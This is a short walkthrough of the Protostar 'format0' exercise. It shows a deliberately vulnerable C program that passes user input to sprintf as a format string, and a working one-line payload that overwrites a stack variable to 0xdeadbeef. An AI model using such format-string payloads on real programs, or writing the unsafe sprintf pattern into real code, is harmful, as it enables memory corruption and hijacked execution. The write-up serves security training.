#### Format0

###### About

- This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.
- Hints
	- This level should be done in less than 10 bytes of input.
	- “Exploiting format string vulnerabilities”
- This level is at ``/opt/protostar/bin/format0``

``format0.c``

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ ./format0 AAAA
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ ./format0 `python -c "print '%64d\xef\xbe\xad\xde'"`
you have hit the target correctly :)
user@protostar:/opt/protostar/bin$
```